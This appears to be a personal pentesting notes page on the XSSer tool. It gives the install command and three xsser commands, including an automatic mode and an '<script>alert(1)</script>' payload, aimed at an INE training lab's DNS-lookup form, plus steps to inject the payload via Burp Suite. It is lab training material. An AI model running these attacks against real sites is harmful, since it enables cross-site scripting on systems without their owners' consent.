---
title: xsser
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, web pentesting
---

## Installation

```bash
sudo apt install xsser
```

## Usage 

The following commands are used in combination with BurpSuite:

```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```

With this, the encoded XSS payload is generated. Now, in Burp Suite, replace the POST parameters with the final attack payload and forward the request.

